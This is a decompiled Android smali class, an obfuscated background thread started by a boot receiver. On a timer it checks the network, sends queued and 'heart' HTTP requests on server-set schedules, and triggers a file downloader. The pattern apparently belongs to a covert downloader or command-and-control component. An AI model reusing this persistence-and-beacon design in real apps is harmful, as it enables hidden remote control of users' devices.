.class public LDaemon/Service/OnlineThread;
.super Ljava/lang/Thread;
.source "OnlineThread.java"


# static fields
.field private static final tag:Ljava/lang/String; = "HeartThread"


# instance fields
.field private heart_open_time:Ljava/lang/String;

.field private final time:J


# direct methods
.method public constructor <init>()V
    .locals 2

    .prologue
    .line 12
    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    .line 15
    const-wide/32 v0, 0x2dc6c0

    iput-wide v0, p0, LDaemon/Service/OnlineThread;->time:J

    .line 16
    const-string v0, "00:"

    iput-object v0, p0, LDaemon/Service/OnlineThread;->heart_open_time:Ljava/lang/String;

    .line 12
    return-void
.end method

.method public static m0820c920()I
    .locals 3

    .prologue
    .line 125
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v0

    .line 126
    .local v0, "c":Ljava/util/Calendar;
    const/16 v2, 0xb

    invoke-virtual {v0, v2}, Ljava/util/Calendar;->get(I)I

    move-result v1

    .line 130
    .local v1, "mHour":I
    return v1
.end method

.method public static m5c911dea()I
    .locals 8

    .prologue
    .line 107
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v0

    .line 108
    .local v0, "c":Ljava/util/Calendar;
    const/4 v6, 0x1

    invoke-virtual {v0, v6}, Ljava/util/Calendar;->get(I)I

    move-result v5

    .line 109
    .local v5, "mYear":I
    const/4 v6, 0x2

    invoke-virtual {v0, v6}, Ljava/util/Calendar;->get(I)I

    move-result v6

    add-int/lit8 v4, v6, 0x1

    .line 110
    .local v4, "mMonth":I
    const/4 v6, 0x5

    invoke-virtual {v0, v6}, Ljava/util/Calendar;->get(I)I

    move-result v2

    .line 111
    .local v2, "mDay":I
    const/16 v6, 0xb

    invoke-virtual {v0, v6}, Ljava/util/Calendar;->get(I)I

    move-result v3

    .line 113
    .local v3, "mHour":I
    mul-int/lit8 v6, v5, 0x64

    mul-int/lit8 v6, v6, 0x64

    mul-int/lit8 v6, v6, 0x64

    mul-int/lit8 v7, v4, 0x64

    mul-int/lit8 v7, v7, 0x64

    add-int/2addr v6, v7

    mul-int/lit8 v7, v2, 0x64

    add-int/2addr v6, v7

    add-int v1, v6, v3

    .line 117
    .local v1, "date":I
    return v1
.end method

.method public static md31ed5d2()Z
    .locals 6

    .prologue
    const/4 v5, 0x0

    .line 137
    sget-object v3, LHamsterSuper/Client/Deamon/BootReceiver;->mCtx:Landroid/content/Context;

    const-string v4, "connectivity"

    invoke-virtual {v3, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    .line 138
    .local v0, "connectivity":Landroid/net/ConnectivityManager;
    if-nez v0, :cond_0

    move v3, v5

    .line 154
    :goto_0
    return v3

    .line 142
    :cond_0
    :try_start_0
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v2

    .line 143
    .local v2, "info":Landroid/net/NetworkInfo;
    if-eqz v2, :cond_1

    invoke-virtual {v2}, Landroid/net/NetworkInfo;->isAvailable()Z

    move-result v3

    if-eqz v3, :cond_1

    .line 144
    const-string v3, "network is true"

    invoke-static {v3}, LDaemon/Service/OnlineThread;->mf7531e2d(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 145
    const/4 v3, 0x1

    goto :goto_0

    .line 147
    .end local v2    # "info":Landroid/net/NetworkInfo;
    :catch_0
    move-exception v3

    move-object v1, v3

    .line 148
    .local v1, "e":Ljava/lang/Exception;
    const-string v3, "no found network error"

    invoke-static {v3}, LDaemon/Service/OnlineThread;->mf7531e2d(Ljava/lang/String;)V

    .line 153
    .end local v1    # "e":Ljava/lang/Exception;
    :cond_1
    const-string v3, "no found network"

    invoke-static {v3}, LDaemon/Service/OnlineThread;->mf7531e2d(Ljava/lang/String;)V

    move v3, v5

    .line 154
    goto :goto_0
.end method

.method public static mf7531e2d(Ljava/lang/String;)V
    .locals 1
    .param p0, "log"    # Ljava/lang/String;

    .prologue
    .line 163
    const-string v0, "HeartThread"

    invoke-static {v0, p0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 164
    return-void
.end method

.method private m843d9bf5()Z
    .locals 8

    .prologue
    const/4 v7, 0x1

    const/4 v6, 0x0

    .line 68
    sget-wide v2, LHamsterSuper/Client/Deamon/BootReceiver;->hearttime:J

    const-wide/16 v4, 0x0

    cmp-long v2, v2, v4

    if-nez v2, :cond_0

    move v2, v6

    .line 95
    :goto_0
    return v2

    .line 72
    :cond_0
    invoke-static {}, LDaemon/Service/OnlineThread;->md31ed5d2()Z

    move-result v2

    if-nez v2, :cond_1

    move v2, v6

    .line 73
    goto :goto_0

    .line 75
    :cond_1
    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->reghttp:LDaemon/Global/RegHttp;

    invoke-virtual {v2}, LDaemon/Global/RegHttp;->readrms()Z

    move-result v2

    if-eqz v2, :cond_2

    .line 76
    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->reghttp:LDaemon/Global/RegHttp;

    invoke-static {v2}, LDaemon/Service/RerviceHttp;->m39bca0c7(LDaemon/Base/HttpBase;)V

    move v2, v6

    .line 77
    goto :goto_0

    .line 80
    :cond_2
    new-instance v2, Ljava/lang/StringBuilder;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {}, LDaemon/Service/OnlineThread;->m0820c920()I

    move-result v4

    add-int/lit8 v4, v4, 0x64

    invoke-static {v4}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v7}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, ":"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 81
    .local v0, "mHour":Ljava/lang/String;
    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->hearthttp:LDaemon/Global/HeartHttp;

    invoke-virtual {v2}, LDaemon/Global/HeartHttp;->getTimeType()Ljava/lang/String;

    move-result-object v1

    .line 83
    .local v1, "timetype":Ljava/lang/String;
    sget v2, LHamsterSuper/Client/Deamon/BootReceiver;->mode:I

    if-nez v2, :cond_3

    move v2, v6

    .line 84
    goto :goto_0

    .line 86
    :cond_3
    if-eqz v1, :cond_4

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v2

    const/4 v3, 0x3

    if-ge v2, v3, :cond_5

    :cond_4
    move v2, v7

    .line 87
    goto :goto_0

    .line 89
    :cond_5
    invoke-virtual {v1, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    const/4 v3, -0x1

    if-eq v2, v3, :cond_6

    iget-object v2, p0, LDaemon/Service/OnlineThread;->heart_open_time:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_6

    .line 90
    iput-object v0, p0, LDaemon/Service/OnlineThread;->heart_open_time:Ljava/lang/String;

    move v2, v7

    .line 91
    goto :goto_0

    :cond_6
    move v2, v6

    .line 95
    goto :goto_0
.end method


# virtual methods
.method public run()V
    .locals 8

    .prologue
    const-wide/32 v6, 0x2dc6c0

    .line 21
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    move-result-object v0

    .line 25
    .local v0, "CASE_Thread":Ljava/lang/Thread;
    :goto_0
    :try_start_0
    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->online:LDaemon/Service/OnlineThread;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eq v0, v2, :cond_0

    .line 37
    :goto_1
    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->heart:LDaemon/Service/OnlineThread;

    if-eq v0, v2, :cond_1

    .line 64
    return-void

    .line 26
    :cond_0
    :try_start_1
    const-string v2, "online start"

    invoke-static {v2}, LDaemon/Service/OnlineThread;->mf7531e2d(Ljava/lang/String;)V

    .line 27
    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->http:LDaemon/Service/RerviceHttp;

    invoke-virtual {v2}, LDaemon/Service/RerviceHttp;->Send_Queue()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    .line 30
    :catch_0
    move-exception v2

    move-object v1, v2

    .line 31
    .local v1, "e":Ljava/lang/Exception;
    const-string v2, "online 505"

    invoke-static {v2}, LDaemon/Service/OnlineThread;->mf7531e2d(Ljava/lang/String;)V

    goto :goto_1

    .line 40
    .end local v1    # "e":Ljava/lang/Exception;
    :cond_1
    :try_start_2
    const-string v2, "heart start"

    invoke-static {v2}, LDaemon/Service/OnlineThread;->mf7531e2d(Ljava/lang/String;)V

    .line 42
    invoke-direct {p0}, LDaemon/Service/OnlineThread;->m843d9bf5()Z

    move-result v2

    if-eqz v2, :cond_2

    .line 44
    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->hearthttp:LDaemon/Global/HeartHttp;

    invoke-static {v2}, LDaemon/Service/RerviceHttp;->m39bca0c7(LDaemon/Base/HttpBase;)V

    .line 46
    :cond_2
    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    invoke-virtual {v2}, LDaemon/DownLoad/FileDownloader;->push()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 53
    :goto_2
    :try_start_3
    sget-wide v2, LHamsterSuper/Client/Deamon/BootReceiver;->hearttime:J

    cmp-long v2, v2, v6

    if-gtz v2, :cond_3

    sget-wide v2, LHamsterSuper/Client/Deamon/BootReceiver;->hearttime:J

    const-wide/16 v4, 0x0

    cmp-long v2, v2, v4

    if-nez v2, :cond_4

    .line 54
    :cond_3
    const-wide/32 v2, 0x2dc6c0

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_1

    .line 57
    :catch_1
    move-exception v2

    move-object v1, v2

    .line 58
    .restart local v1    # "e":Ljava/lang/Exception;
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "heart time 505"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, LDaemon/Service/OnlineThread;->mf7531e2d(Ljava/lang/String;)V

    goto :goto_1

    .line 48
    .end local v1    # "e":Ljava/lang/Exception;
    :catch_2
    move-exception v2

    move-object v1, v2

    .line 49
    .restart local v1    # "e":Ljava/lang/Exception;
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "heart txt 505"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, LDaemon/Service/OnlineThread;->mf7531e2d(Ljava/lang/String;)V

    goto :goto_2

    .line 56
    .end local v1    # "e":Ljava/lang/Exception;
    :cond_4
    :try_start_4
    sget-wide v2, LHamsterSuper/Client/Deamon/BootReceiver;->hearttime:J

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_1
.end method
